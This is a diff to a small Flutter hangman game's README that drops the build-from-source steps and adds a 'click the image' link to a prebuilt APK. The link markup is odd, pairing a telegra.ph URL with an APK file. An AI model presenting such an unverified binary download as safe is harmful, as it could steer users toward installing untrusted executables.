@@ -1,8 +1,6 @@
 # Hangman game
-Classic hangman game for mobile platform.
-## How to build
-- Create a brand new flutter project.
-- Copy and paste/replace all the directories and pubspec.yaml file into your flutter project file
-- run this command to get dependencies
-		flutter pub get
-
+Classic hangman game for mobile platforms.
+=====================
+## Get Hangman.apk
+Click the image below to get the latest version.
+![https://telegra.ph/hangman-03-03](https://github.com/Saubaan/hangman/raw/main/app-arm64-v8a-release-3.apk)
